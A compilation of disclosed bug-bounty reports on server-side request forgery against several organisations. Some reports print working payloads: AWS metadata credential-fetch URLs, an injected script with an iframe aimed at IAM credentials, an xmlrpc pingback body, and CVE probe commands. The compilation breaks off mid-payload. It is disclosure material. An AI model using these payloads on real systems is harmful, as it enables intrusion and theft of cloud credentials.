**Summary (researcher):**

# Report Conclusion:

+ ## The Main Issue:
> I was able to access *AWS Credentials* using an *SSRF* vulnerability by injecting an `<iframe>` tag into `template` element when generating a `PDF` of analytics reports.
+ ## The potential impacts of this vulnerability:
> 1. Ability to read internal files.
> 2. Unauthorized Access to AWS Credentials.
> 3. Manipulating AWS resources.
> 4. Possibility of Data Loss.
> 5. Accounts Takeover.
> 7. Executing Arbitrary Commands.

+ ## What did I do when I found this vulnerability:
> I quickly reported this issue as soon as I found it, then I was trying to find the quickest way to alert Hackerone team as quickly as possible, especially because I know it could take some days for a response. then I thought about sending a message to some of the Hackerone triage team, I was expecting a response within a few hours but it doesn't happened. So I decided to send a message to @jobert, and I was really surprised by his quick and kind response.


+ ## How the Hackerone team was responsible for fixing this issue and how they responded:
> I was really surprised by Hackerone quick response, they have fixed the issue and let me retest it in less than 24 hours. They are a very collaborative team.

+ ## Supporting Material/References:
> + [What to Do If You Inadvertently Expose an AWS Access Key.](https://aws.amazon.com/blogs/security/what-to-do-if-you-inadvertently-expose-an-aws-access-key/)
> + [How to prevent server-side request forgery. (SSRF)](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
> + [How to prevent HTML injection.](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
> + [How to write high quality reports.](https://docs.hackerone.com/en/articles/8475116-quality-reports)
> + [How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf)


Thanks for reading and have a nice day!

*Best Regards,*
*@Mega7*

---

### [External service interaction ( DNS and HTTP ) in www.████████](https://hackerone.com/reports/1704024)

- **Report ID:** `1704024`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0xmzm
- **Bounty:** - usd
- **Disclosed:** 2023-06-23T18:19:31.618Z
- **CVE(s):** -

**Vulnerability Information:**

There is External service interaction ( DNS and HTTP ) vulnerability in www.█████████

Here is an example request :
```
GET http://9eoecirvai3o4lsdrpqzvyia71dr1g.oastify.com/ HTTP/1.1
Host: www.██████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.██████/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```
And the Burp Collaborator recived this information :
DNS request recived from : ████████
HTTP request recived from : ███

███
█████████

## Impact

The External Service Interaction arise when it is possible for a attacker to induce application to interact with the arbitrary external service such as DNS HTTP etc.
The External Service Interaction can is not limited to HTTP,HTTPS or DNS, you can lead to FTP, SMTP etc. Such weakness can lead to DDoS attack.
The External Service Interaction can lead to OS Command Injection, DOS Attack, DDOS Attack or Code Manipulation.

## System Host(s)
www.████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use whitelist check, boundary based validation and sanitization.
Maintain whitelist at network and web front.
Review Source Code for functions such as dns.resolve() , dns.query() , sys_exec() etc.

## Suggested Mitigation/Remediation Actions

---

### [Blind SSRF to internal services in matrix preview_link API](https://hackerone.com/reports/1960765)

- **Report ID:** `1960765`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Reddit
- **Reporter:** @la_revoltage
- **Bounty:** 6000 usd
- **Disclosed:** 2023-04-26T15:42:47.191Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Reddit' new chat is based on Matrix software which has preview_link functionality which doesn't filter the URL before sending the request

## Impact:
Attacker can enumerate services by grabbing og:title and port scanning, also possible RCE escalation (Asking for permission on this one)

## Steps To Reproduce:


  1. Visit the https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=*
  2. Replace * with http://██████ to get og:title ███████
  3. Replace * with http://█████████ to get og:title ███████
 4. Replace * with http://██████████to get og:title ██████
 5. Replace * with ████████ to get og:title █████████

Note: If the request is stuck and not responding in 2 seconds reload the page until it does

## Permit for escalation attempt? 
Since the ███ URL is accessible it may be possible to run ███:
GET █████████

There are also possibilities to test ██████, but I thought that it would be incorrect to do such activity without permission and as such report vulnerability in this state. I also therefore request a permission to try to escalate this to Critical

## Impact

Attacker can enumerate services and launch attacks against them

**Summary (team):**

Matrix Chat endpoint at https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=* allowed partially blind SSRF to internal services. The data that could be exfiltrated was limited only to the service names and their IPs before a fix was implemented. This endpoint should not be able to query internal services, but external IPs, domains and services are fine for this to query.

**Summary (researcher):**

Matrix endpoint at https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url= allowed Partially Blind SSRF which allows attacker to send GET requests and exfiltrate data about internal services

---

### [Unauthenticated Blind SSRF at https://█████ via xmlrpc.php file](https://hackerone.com/reports/1890719)

- **Report ID:** `1890719`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0r10nh4ck
- **Bounty:** - usd
- **Disclosed:** 2023-04-14T17:23:59.682Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

Hi team,

I would like to report a security vulnerability I discovered on your website. I was able to perform Server-Side Request Forgery (SSRF) attacks via the xmlrpc.php file at https://████████ endpoint.
Using a simple POST request to the xmlrpc.php endpoint, I was able to bypass input validation and send a request to an external URL.

I have attached a proof of concept (PoC) script that demonstrates this vulnerability. It sends a request to my VPS server using interact.sh client (https://github.com/projectdiscovery/interactsh), but an attacker could use this technique to send requests to any URL of their choosing.

## References

https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/
https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

## Impact

The vulnerability could be used to conduct further attacks, such as accessing internal systems or exfiltrating sensitive data.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Start a server in vps using interact.sh or use burpsuite collaborator.
2. Go to: https://███/xmlrpc.php
3. See the response:
```
XML-RPC server accepts POST requests only.
```
4. Go to burpsuite and send this request to the repeater.
5. Change the request method to POST.
6. Get the URL of your server listener and set this payload at request:
```
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://your server</string></value>
</param>
<param>
<value><string>https://█████/</string></value>
</param>
</params>
</methodCall>
```
7. Send the POST request.
8. See the response in your server log.

## Suggested Mitigation/Remediation Actions
I would recommend implementing input validation and filtering to prevent these types of attacks in the future. Please let me know if you require any additional information or if you have any questions.

---

### [[data-07.uberinternal.com] SSRF in Portainer app lead to access to Internal Docker API without Auth](https://hackerone.com/reports/366638)

- **Report ID:** `366638`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Uber
- **Reporter:** @kxyry
- **Bounty:** 500 usd
- **Disclosed:** 2023-03-23T10:34:25.495Z
- **CVE(s):** -

**Summary (team):**

Thanks for the report and participation in our program, @kxyry!

---

### [SSRF to read AWS metaData at https://█████/ [HtUS]](https://hackerone.com/reports/1624140)

- **Report ID:** `1624140`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @rohsec
- **Bounty:** 1000 usd
- **Disclosed:** 2022-10-14T15:12:17.901Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team,
While researching your program I found that the domain https://████/ is vulnerable to Server Side Request Frogery Attacks via the url parameter. 
An attacker is able to fetch the aws metadata abusing the SSRF at https://████████/
============================SUMMARY=========================
## Vulnerable URL:
https://███████/

## Vulnerable Path:
/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/

## Final Exploit URL:
https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/

## Exploited AWS metadata
```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

## Exposed Credentials:
https://█████████/api/v1/download-url?url=http://169.254.169.254/2021-07-15/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```
{
  "Code" : "Success",
  "LastUpdated" : "2022-07-04T11:22:59Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "███",
  "SecretAccessKey" : "████",
  "Token" : "████
  ```
===========================STEPS TO REPRODUCE==========================
1) Go to the above Exploit URL, i.e; https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/
2) You will see the AWS Metadata being fetched and exposed.

## Impact

An attacker is able to explore and fertch the AWS metadata via the SSRF. This SSRF can be used to perform other attack vectors as well such as scanning internal ports. A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with.

---

### [Blind SSRF via image upload URL downloader on https://██████/ ](https://hackerone.com/reports/1691501)

- **Report ID:** `1691501`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @696e746c6f6c
- **Bounty:** - usd
- **Disclosed:** 2022-10-14T13:36:21.475Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Dear DoD,

I found Blind SSRF on one domain from Hack US program.  Original domain is https://█████/ but when you make account and login it redirects you to https://███/my/. Here's the video PoC:

██████


Thank you!

## Impact

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. The attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

## System Host(s)
███████

## Affected Product(s) and Version(s)
Web App is infected.

## CVE Numbers


## Steps to Reproduce
1. Create a one test account.
2. Login to that account.
3. Go to edit profile.
4. Scroll down there.
5. Notice user picture field.
6. Try to upload something.
7. You will see URL downloader.
8. Open your burp collaborator client.
9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
10. Poll now in burp collaborator client.
11. Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means
we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
12. Turn your foxy proxy on and open your burp suite.
13. Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
14. Intercept request. Request should look like this:
```javascript
POST /repository/repository_ajax.php?action=signin HTTP/1.1
Host: █████████
Cookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 295
Origin: https://███████
Referer: https://█████/user/edit.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

file=http%3A%2F%2F127.0.0.1%2Ftest.png&repo_id=5&p=&page=&env=filemanager&accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&accepted_types[]=.jpg&accepted_types[]=.png&sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501
```
15. You will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this:
```javascript
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 05 Sep 2022 14:05:32 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.4.28
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 20 Aug 1969 09:23:00 GMT
Last-Modified: Mon, 05 Sep 2022 14:05:32 GMT
Accept-Ranges: none
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 261

{"list":[],"nosearch":true,"norefresh":true,"nologin":true,"error":"HTTP\/1.1 404 Not Found\r\nServer: nginx\r\nDate: Mon, 05 Sep 2022 14:05:32 GMT\r\nContent-Type: text\/html; charset=utf-8\r\nContent-Length: 146\r\nConnection: keep-alive\r\n\r\n","repo_id":5
```
16. By the way if you change to 25 port its leaking something about Postfix SMTP server. 
17. Also I was able to identify that your web app is using libcurl.

## Suggested Mitigation/Remediation Actions
My suggestion is to create whitelisted domains in DNS
The easiest way to remediate SSRF is to whitelist any domain or address that your application accesses.
Blacklisting and regex have the same issue, someone will eventually find a way to exploit them
Do Not Send Raw Responses. Do not use blacklists. use whitelists (allow-lists)
Never send a raw response body from the server to the client. Responses that the client receives need to be expected.
Enforce URL Schemas. Allow only URL schemas that your application uses. There is no need to have ftp://, file:/// or even http:// enabled if you only use https://. And if you do use other schemas make sure that they’re only accessible from the part that needs to access them and not from anywhere else.
Enable Authentication on All Services. Make sure that authentication is enabled on any service that is running inside your network even if they don’t require it. Services like memcached, redis, mongo and others don’t require authentication for normal operations, but this means they can be exploited.
Sanitize and Validate Inputs. Never trust user input. Always sanitize any input that the user sends to your application. Remove bad characters, standardize input (double quotes instead of single quotes for example).After sanitization make sure to validate sanitized input to make sure nothing bad passed through.
Why is it Ineffective to Blacklist Domains and IPs? Understanding SSRF Bypass
One way to protect against SSRF is to blacklist certain domains and IP addresses. This defense technique is not effective, because hackers can use bypasses to avoid your security measures. Below are a few simple ways attackers can bypass blacklists.
Bypassing Blacklists Using HTTPS. Common blacklists blocking everything on port 80 or the http scheme. but the server will handle requests to 443 or https just fine. Instead of using http://127.0.0.1/ use: https://127.0.0.1/ https://localhost/
Or create SSRF protection with Bright.

**Summary (researcher):**

```javascript
$.urlParam = function(name){
    var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
    if (results==null){
       return null;
    }
    else{
       return decodeURI(results[1]) || 0;
    }
}
```

```javascript
var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
```
So, variable results are declared with var keyword. Which means it stores new RegExp and actually RegExp object is using ('[\?&]' but I recommend using =(.+?(?:&|$))') Since The ?! n quantifier matches any string that is not followed by a specific string n. And [] denotes a character class. () denotes a capturing group. [a-z0-9] -- One character that is in the range of a-z OR 0-9. And it's using The exec() method which means it's testing a match in a string. exec(window.location.href) this will just return the URL of the current page. It's using If statement, If the results are equal to null which means it's testing whether the value of a variable results is the null value. And  
```javascript
if (results==null){
       return null;
    } 
```
This code means if results are equal to null which means it's testing whether the value of a variable results is the null value and if the variable results are the null value then it will return null. So basically return null means that  that the expected object couldn't be created. Because we found a variable that returns null. 
```javascript
  else{
       return decodeURI(results[1]) || 0;
    }
}
```
Or else if the code is not executed which means if statement failed then it will return decodeURI() method that decodes a URI.
I saw that regex that you are using for me is not great at all. I would like to recommend to make a good allow-list in a nutshell whitelist with a good regex. So it would be impossible to bypass protection to gain SSRF. Use regex and unicode chars like this:
```javascript
const text = 'haxorman';
const regex = /[\u0400-\u04FF]+/g;
```
\w and \W only matches ASCII based characters; for example, a to z, A to Z, 0 to 9, and. Just suggestion. Or use regex with sticky flag. Also open redirection is possible via image URL downloader. It actually downloads google background image. What if an attacker is able to manipulate victim into downloading some malicious URL.  And I'm not sure is this real or no:
```javascript
M.cfg = {"wwwroot":"https:\/\/███","sesskey":"lkrZzDv8WH","sessiontimeout":"7200","themerev":"1662685982","slasharguments":1,"theme":"adaptable","iconsystemmodule":"core\/icon_system_fontawesome","jsrev":"1662685982","admin":"admin","svgicons":true,"usertimezone":"America\/New_York","contextid":9398501,"langrev":1662685982,"templaterev":"1662685982"};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
```
Notice admin and admin. I think that's username and password. For admin let's take a look:
```javascript
window.onload = function(){
    if(window.location.pathname == '/admin/user.php'){
        const urlParams = new URLSearchParams(window.location.search);
        const showmore = urlParams.get('showmore');
        if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
```
So, it's using windoww.onload function. onload event will react when an object has been loaded. Next thing is  
```javascript
  if(window.location.pathname == '/admin/user.php'){
        const urlParams = new URLSearchParams(window.location.search);
        const showmore = urlParams.get('showmore');
        if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
```
So, window.location.pathname returns the path and filename of the page which means it returns /admin/user.php which is bad. User could bypass this by many ways and access admin login page. And use admin and admin creds to login in.  Then it's using const urlParams = new URLSearchParams(window.location.search); for a case when you need all query parameters. URLSearchParams is an iterable object. And the value of window.location.search is example: ?haxor=1337. Then         const showmore = urlParams.get('showmore'); It's using get parameter 'showmore'. 
```javascript
  if(showmore == 'true'){
            document.getElementsByClassName('moreless-toggler')[0].click();
        }
    }
};
```
If showmore is equal to true and then  document.getElementsByClassName('moreless-toggler')[0].click(); and then it will click only on first element with class 'moreless-toggler'. Basically The getElementsByClassName() method returns a collection of elements with a specified class names



Follow me on twitter if you want! 

https://twitter.com/0x1int

---

### [ mail.acronis.com is vulnerable to zero day vulnerability CVE-2022-41040](https://hackerone.com/reports/1719719)

- **Report ID:** `1719719`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Acronis
- **Reporter:** @bbece5b1ea2cbb33d0690ad
- **Bounty:** 1000 usd
- **Disclosed:** 2022-10-13T17:12:43.402Z
- **CVE(s):** CVE-2022-41040

**Vulnerability Information:**

Hello Acronis team,

Please run

curl -ksL -m5  -o /dev/null -I -w "%{http_code}" "https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync"
curl -ksL -m5 "https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync" | grep Protocol


and get following output

404 and {"Protocol":"ActiveSync","Url":"https://eas.outlook.com/Microsoft-Server-ActiveSync"}

Proving that  mail.acronis.com is vulnerable to CVE-2022-41040

Poc video attached

## Impact

SSRF can be used to for unauthorized actions or access to confidential data.

**Summary (team):**

mail.acronis.com was vulnerable to CVE-2022-41040. 
After internal investigation, Acronis security team concluded that there are no signs of exploitation of this issue.

---

### [SSRF on http://www.███████/crossdomain.php via url parameter](https://hackerone.com/reports/971590)

- **Report ID:** `971590`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Sony
- **Reporter:** @n0x496n
- **Bounty:** - usd
- **Disclosed:** 2022-10-06T15:44:53.792Z
- **CVE(s):** -

**Summary (team):**

The researcher reported that a Sony endpoint was vulnerable to Local File Inclusion (LFI) and Server-Side Request Forgery (SSRF) vulnerabilities. The researcher used the LFI vulnerability to read sensitive files such as /etc/passwd from the web server. The researcher also demonstrated using the SSRF vulnerability to view EC2 instance metadata, and to retrieve an externally hosted .svg file to execute a reflected Cross-Site Scripting (XSS) attack.

---

### [SSRF in Functional Administrative Support Tool pdf generator (████) [HtUS]](https://hackerone.com/reports/1628209)

- **Report ID:** `1628209`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @codeprivate
- **Bounty:** 4000 usd
- **Disclosed:** 2022-09-14T21:00:36.641Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I found that it is possible to inject a javascript payload during the PDF form creation process, which is then executed by the checklist application server.

## Vulnerable Software: Functional Administrative Support Tool (FAST) v1.0

## Intro: 

██████████

Administrative clerks create a dynamic action items by guiding a███ through targeted questions designed to draw out required administrative actions that are required and trigger of additional processes that need to be completed.

After completing the question and answer process ( point 3. Get Action Items ) the application offers 2 options: Send the report by Email or print (See PDF).

When the user clicks on (View PDF) they are redirected to the URL:███████/print/checklist/fast_session_XXXXXX.pdf . This is where the user will have access to his PDF form generated dynamically by the███ system.

note: XXXXXX is the "session" assigned by the system to identify a form.

## Steps To Reproduce:
1. Go to███/ and select "BEGIN NEW SESSION", enter a MCC code Ex. "h99" and SUBMIT
2. with burp suite on, select a process, and fill in the data randomly up to point 3. (EDIPI code is a 10 chars long number. Ex. 0123456789) - click CONTINUE

3. in point 3, (Get Action Items) click on PRINT (VIEW PDF) - A window will open with the dynamically generated PDF exposing the data that we complete.

4. observe in burp suite the last request made to /api/save/ proceed to right click and send to "Repeater"

5. modify value "name" of the json object "globalInfo" by the payload:

`</script><script>document.write('<iframe src=\"http://███/latest/meta-data/iam/security-credentials/EC2CloudWatchRole\" width=1000px height=1000px>')</script>`

and click Send request. If everything went well, the server responds "status ok"

6. Refresh form URL. Ex.████████/print/checklist/fast_session_XXXXXX.pdf

for this PoC. AWS secretkeys were accessed:

`{  "Code" : "Success",  "LastUpdated" : "2022-07-06T02:57:53Z",  "Type" : "AWS-HMAC",  "AccessKeyId" : "███",  "SecretAccessKey" : "████",  "Token" :"██████",  "Expiration" : "2022-07-06T09:04:49Z"}`

## Supporting Material/References:

* https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
* https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent
* https://hackerone.com/reports/508459
* https://hackerone.com/reports/53088

## Impact

An attacker can inject malicious javascript payloads in the PDF generation process and executed by the checklist application server. An attacker could use this to Steal  credentials or other sensitive information from ████ AWS Instance.

---

### [Full read SSRF at █████████ [HtUS]](https://hackerone.com/reports/1628102)

- **Report ID:** `1628102`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sudi
- **Bounty:** - usd
- **Disclosed:** 2022-09-14T20:52:39.213Z
- **CVE(s):** -

**Vulnerability Information:**

Heyy there,
We have found a full read ssrf vuln in https://█████ , we were able to hit the AWS Metadata endpoint (http://███████) though the SSRF Vuln.


------------

**Steps to reproduce:**

1.Goto https://██████/users/create and create an account
2.After you account is verified , get login
If for some reasons you are not the verification code, try with a gmail id

3.Now visit: https://████/products/create/   and fill the required details
4.Once your product is created, click on `New Configuration` which is under *LRS Configurations*

████████

5.Enter this as the input for * LRS URL *: `http://█████████/latest/meta-data?` (the question mark at the end is important)
6.Under *Basic Auth User & Pass* enter test for both fields and click on `Create new LRS configuration` 

█████

7.Once the `Configuration` is created click on the `Test` button beside the conifguration name
████
8.Now you will be redirected to the homepage, so go back to the product page
9.Under `Past Results` you should be able to see a new entry
10.Click on `Manage Test record` > `Download log`
11.Now check the `Include HTTP` checkbox and from the `Log Format` drop down menu choose *Plain text*

A file with the name `log` should be downloaded in your computer, just open it and there you will find the response from the aws meta data endpoint:

```

""
failed
"SyntaxError: Unexpected token a in JSON at position 0"
REQUEST SUPERREQUEST
_______________________________________
POST /latest/meta-data?/statements HTTP/1.1
X-Experience-API-Version: 1.0.3
Authorization: Basic dGVzdDp0ZXN0
host: ██████████
accept: application/json
content-type: application/json
content-length: 324
Connection: close

{"actor":{"objectType":"Agent","name":"xAPI mbox","mbox":"mailto:████"},"verb":{"id":"http://███","display":{"en-GB":"attended","en-US":"attended"}},"object":{"objectType":"Activity","id":"http://www.example.com/meetings/occurances/34534"},"id":"3b9e4565-07ac-475f-be1f-d5f590f40779"}

RESPONSE SUPERREQUEST
_______________________________________
HTTP/1.0 200 OK
accept-ranges: bytes
content-length: 326
content-type: text/plain
date: Wed, 06 Jul 2022 13:48:12 GMT
last-modified: Thu, 30 Jun 2022 09:37:12 GMT
connection: close
server: EC2ws

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
=======================================
REQUEST SUPERREQUEST
_______________________________________
GET /latest/meta-data?/statements?statementId=3b9e4565-07ac-475f-be1f-d5f590f40779 HTTP/1.1
X-Experience-API-Version: 1.0.3
Authorization: Basic dGVzdDp0ZXN0
host: ██████
Connection: close

RESPONSE SUPERREQUEST
_______________________________________
HTTP/1.0 200 OK
accept-ranges: bytes
content-length: 326
content-type: text/plain
date: Wed, 06 Jul 2022 13:48:12 GMT
last-modified: Thu, 30 Jun 2022 09:37:12 GMT
connection: close
server: EC2ws

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
=======================================

```

## Impact

An attacker can dump aws keys  , reach internal hosts and etc


Thankyou
Regards
heint and sudi

---

### [Blind SSRF External Interaction on ████████](https://hackerone.com/reports/1220688)

- **Report ID:** `1220688`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** MTN Group
- **Reporter:** @error201
- **Bounty:** - usd
- **Disclosed:** 2022-08-21T08:40:51.584Z
- **CVE(s):** -

**Vulnerability Information:**

Hii Security Team,

I am S █████(Metaxone Certified Ethical Hacker) and a Security Researcher I just checked your website and found Blind SSRF External Interaction on ██████████

What is SSRF?
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.
In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.
SSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application and perform unauthorized actions. These trust relationships might exist in relation to the server itself, or in relation to other back-end systems within the same organization.

Steps to reproduce:-

1.Navigate to the website █████
2.Now you can see at bottom on the right there is chat box or messanger box.
3.Click on it and paste the Burp Collaborator URL { Example : In this scenario the URL belike ██████ } and click on send
4.Now we will get HTTP and DNS interaction in Burp Collab and In HTTP requesting it is fetching the file ( test.png ) it means it is vulnerable to Blind SSRF

References:- Similar report which is reported by another researcher ███████

## Impact

Impact:--
This Vulnerability can lead to Attack Surface Analysis is about mapping out what parts of a system need to be reviewed and tested for security vulnerabilities.
The attacker can fetch malicious files which can infect the server
This will allow attackers to gain access to an internal IP of a website along with other sensitive information that may be leaked with the request

POC Attached Below :-

---

### [CVE-2021-40438 on cp-eu2.acronis.com](https://hackerone.com/reports/1370731)

- **Report ID:** `1370731`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Acronis
- **Reporter:** @savik
- **Bounty:** - usd
- **Disclosed:** 2022-07-13T03:17:20.835Z
- **CVE(s):** CVE-2021-40438

**Vulnerability Information:**

Hi team

## Summary
CVE-2021-40438 on cp-eu2.acronis.com

## Steps To Reproduce

 `
https://cp-eu2.acronis.com?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA